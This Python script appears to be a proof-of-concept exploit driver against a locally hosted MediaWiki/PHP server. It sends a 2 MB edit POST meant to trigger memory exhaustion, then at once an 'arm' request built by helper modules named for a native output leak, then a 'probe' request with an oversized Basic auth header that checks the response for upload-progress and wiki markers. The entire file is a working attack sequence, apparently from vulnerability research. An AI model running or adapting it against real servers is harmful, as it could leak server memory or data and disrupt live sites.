#!/usr/bin/env python3
"""Coupled sequence: 2M producer POST -> ARM immediately (<1s) -> probe.
Adds worker-pid receipts between steps (external pgrep by driver runner, not here)."""
import http.client
import importlib.util
import json
import re
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent


def load(name, rel):
    spec = importlib.util.spec_from_file_location(name, HERE / rel)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


LEAK = load("leak", "native-output-leak.py")
STOCK = load("stock", "native-output-leak-stock-arm.py")
COMPACT = load("compact", "compact-stock-tail.py")

HOST, PORT, HH, PATH2M = "127.0.0.1", 28840, "127.0.0.1:28840", "/index.php"
HDR = {"Host": HH, "User-Agent": "producer-run/1.0", "Connection": "close"}


def hreq(method, path, body=None, ctype=None, timeout=45):
    h = dict(HDR)
    if ctype:
        h["Content-Type"] = ctype
    conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    conn.request(method, path, body=body, headers=h)
    r = conn.getresponse()
    data = r.read()
    conn.close()
    return r.status, data


def main():
    outdir = Path(sys.argv[1])
    outdir.mkdir(parents=True, exist_ok=True)

    # --- producer: multipart edit POST wpTextbox1=2MB ---
    n = 2_000_000
    b = b"----PRODBOUND123"
    fields = {
        "wpTextbox1": b"A" * n,
        "wpEditToken": b"+\\",
        "wpSummary": b"producer",
        "wpSave": b"Save page",
        "wpStarttime": b"20261021000000",
        "wpEdittime": b"20261021000000",
        "title": b"Sandbox",
    }
    parts = [
        b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" + name.encode()
        + b"\"\r\n\r\n" + val + b"\r\n"
        for name, val in fields.items()
    ]
    parts.append(b"--" + b + b"--\r\n")
    pbody = b"".join(parts)
    (outdir / "producer-request.bin").write_bytes(pbody)
    t0 = time.time()
    st, data = hreq("POST", "/index.php?title=Sandbox&action=submit", pbody,
                    "multipart/form-data; boundary=----PRODBOUND123")
    print(json.dumps({"step": "producer", "status": st, "bytes": len(data),
                      "elapsed": round(time.time() - t0, 3),
                      "markers": [m.decode() for m in (b"Allowed memory", b"Unknown on line 0") if m in data]}))
    (outdir / "producer-response.bin").write_bytes(data)

    # --- arm immediately ---
    abody = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
    areq = LEAK.request_bytes(HH, PATH2M, abody, None, 23, False)
    (outdir / "arm-request.bin").write_bytes(areq)
    conn = socket_conn()
    conn.sendall(areq)
    stream = conn.makefile("rb", buffering=0)
    t1 = time.time()
    try:
        resp, dec, hdrs, status = LEAK.read_response(stream)
        rec_arm = {"step": "arm", "status": status, "bytes": len(dec),
                   "elapsed": round(time.time() - t1, 3),
                   "sha12": __import__("hashlib").sha256(dec).hexdigest()[:12]}
    except Exception as e:
        rec_arm = {"step": "arm", "error": f"{type(e).__name__}: {e}"}
        resp, dec = b"", b""
    print(json.dumps(rec_arm))
    (outdir / "arm-response.bin").write_bytes(resp)
    (outdir / "arm-body.bin").write_bytes(dec)
    try:
        conn.close()
    except OSError:
        pass

    # --- probe (LEAK.probe_body) ---
    pbody2 = LEAK.probe_body()
    preq = LEAK.request_bytes(HH, PATH2M, pbody2, b"", 64, True)
    (outdir / "probe-request.bin").write_bytes(preq)
    t2 = time.time()
    try:
        conn = http.client.HTTPConnection(HOST, PORT, timeout=45)
        conn.request("POST", PATH2M, body=pbody2, headers={
            "Host": HH, "Connection": "close",
            "Authorization": "Basic " + __import__("base64").b64encode(b"U" * 64 + b":").decode(),
            "Content-Type": "multipart/form-data; boundary=NATIVEOUTPUTEXACT",
        })
        r = conn.getresponse()
        pdata = r.read()
        rec_probe = {"step": "probe", "status": r.status, "bytes": len(pdata),
                     "elapsed": round(time.time() - t2, 3),
                     "markers": [m.decode() for m in (b"Allowed memory", b"MediaWiki", b"upload_progress") if m in pdata]}
        (outdir / "probe-response.bin").write_bytes(pdata)
    except Exception as e:
        rec_probe = {"step": "probe", "error": f"{type(e).__name__}: {e}"}
    print(json.dumps(rec_probe))


def socket_conn():
    import socket
    c = socket.create_connection((HOST, PORT), timeout=50)
    c.settimeout(50)
    return c


if __name__ == "__main__":
    main()
